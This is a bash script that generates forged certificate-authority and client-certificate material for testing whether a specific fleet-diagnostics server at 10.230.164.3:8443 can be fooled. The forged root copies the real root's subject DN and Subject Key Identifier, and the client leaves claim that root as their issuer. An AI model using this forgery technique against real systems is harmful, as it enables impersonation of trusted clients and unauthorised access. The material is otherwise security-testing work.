#!/usr/bin/env bash
# Build w-series client-cert material for the "naive validation bypass" tests on 10.230.164.3:8443.
#
# Key point: the real root DN is DER-encoded with a PrintableString (tag 0x13):
#   30 25 31 23 30 21 06 03 55 04 03 13 1a "CV6 Fleet Diagnostics Root"
# `string_mask = pkix` makes OpenSSL emit exactly that tag (verified by der_dn.py:
# "CN value tag : 0x13"), so the forged CA's subject DN is BYTE-IDENTICAL to the
# real root DN. That is what falsifies the hypothesis
# "the server compares issuer DN bytes / subject strings only".
#
# Real root SKI (from the AKI of the server leaf):
#   47:6E:90:16:4F:64:70:BB:1C:80:72:36:AB:3C:54:70:03:78:10:99
#
# Note: this box's OPENSSL_CONF points at a non-existent file, so every openssl
# subcommand is given an explicit -config.
set -eu
cd "$(dirname "$0")"
OUT=mat2w          # separate from mat2/ (a concurrent writer owns that dir)
mkdir -p "$OUT"
cd "$OUT"
rm -f *.pem *.key *.csr *.srl leaf.ext

ROOT_CN="CV6 Fleet Diagnostics Root"
ROOT_SKI_HEX="476e90164f6470bb1c807236ab3c547003781099"

cat > openssl.cnf <<'EOF'
openssl_conf = openssl_init
[openssl_init]
providers = provider_sect
[provider_sect]
default = default_sect
[default_sect]
activate = 1
[req]
distinguished_name = dn
string_mask = pkix
prompt = no
x509_extensions = v3_ca
[dn]
CN = placeholder
[v3_ca]
basicConstraints = critical,CA:TRUE
keyUsage = critical,keyCertSign,cRLSign,digitalSignature
subjectKeyIdentifier = hash
EOF
# openssl here is a native Win32 binary: it cannot open MSYS-style /d/... paths.
export OPENSSL_CONF="$(cygpath -w "$PWD/openssl.cnf")"

echo "== 1. forged root CA, natural SKI =="
openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes \
  -keyout w_ca.key -out w_ca.pem -days 90 -config openssl.cnf \
  -subj "/CN=$ROOT_CN" 2>/dev/null

echo "== 2. forged root CA, SKI forced to the real root's SKI =="
openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes \
  -keyout w_ca_ski.key -out w_ca_ski.pem -days 90 -config openssl.cnf \
  -subj "/CN=$ROOT_CN" \
  -addext "basicConstraints=critical,CA:TRUE" \
  -addext "keyUsage=critical,keyCertSign,cRLSign,digitalSignature" \
  -addext "2.5.29.14=DER:04:14:$ROOT_SKI_HEX" 2>/dev/null

leaf_ext() { # $1 = natural|realroot -> writes leaf.ext
  {
    echo "basicConstraints=critical,CA:FALSE"
    echo "keyUsage=critical,digitalSignature"
    echo "extendedKeyUsage=clientAuth"
    echo "subjectAltName=DNS:tbox"
    if [ "$1" = natural ]; then
      echo "authorityKeyIdentifier=keyid:always"
    else
      echo "2.5.29.35=DER:30:16:80:14:$ROOT_SKI_HEX"
    fi
  } > leaf.ext
}

mk_leaf() { # tag ca cakey aki_mode cn
  openssl req -new -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes \
    -keyout "$1.key" -out "$1.csr" -config openssl.cnf -subj "/CN=$5" 2>/dev/null
  leaf_ext "$4"
  openssl x509 -req -in "$1.csr" -CA "$2" -CAkey "$3" -CAcreateserial \
    -days 60 -extfile leaf.ext -out "$1.pem" 2>/dev/null
  rm -f "$1.csr"
}

echo "== 3. leaves =="
mk_leaf w1_leaf          w_ca.pem     w_ca.key     natural  diag-eng-01
mk_leaf w2_leaf_aki      w_ca.pem     w_ca.key     realroot diag-eng-01
mk_leaf w3_leaf_skica    w_ca_ski.pem w_ca_ski.key realroot diag-eng-01
mk_leaf w4_leaf_cn_tbox  w_ca.pem     w_ca.key     natural  tbox

for t in w1_leaf w2_leaf_aki w4_leaf_cn_tbox; do cat "$t.pem" w_ca.pem > "${t}_chain.pem"; done
cat w3_leaf_skica.pem w_ca_ski.pem > w3_leaf_skica_chain.pem

echo "== 4. odd shapes (python: mat2_shapes.py) =="
python ../mat2_shapes.py

echo
echo "--- built ---"
for f in *.pem; do
  printf '%-30s %s\n' "$f" "$(openssl x509 -in "$f" -noout -subject -issuer 2>/dev/null | tr '\n' '|')"
done
